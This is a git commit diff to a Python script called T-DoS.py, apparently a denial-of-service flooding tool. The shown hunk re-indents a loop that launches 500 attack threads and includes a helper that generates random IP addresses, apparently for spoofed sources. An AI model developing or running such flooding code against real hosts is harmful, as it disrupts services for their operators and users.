4b89b69d3458685cd3faf31a2a2113298569b9d5
Tommaso Bona <piergeolo@gmail.com>
2022-12-02 12:27:12 +0100

    Update T-DoS.py

--- T-DoS.py
+++ T-DoS.py
@@ -21,9 +21,9 @@ def Attack(target, port):
 	print(attack_num)
 
         s.close()
-    for i in range(500):
-        thread = threading.Thread(target = attack)
-        thread.start()
+        for i in range(500):
+            thread = threading.Thread(target = attack)
+            thread.start()
 
 def randomIP():
 	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
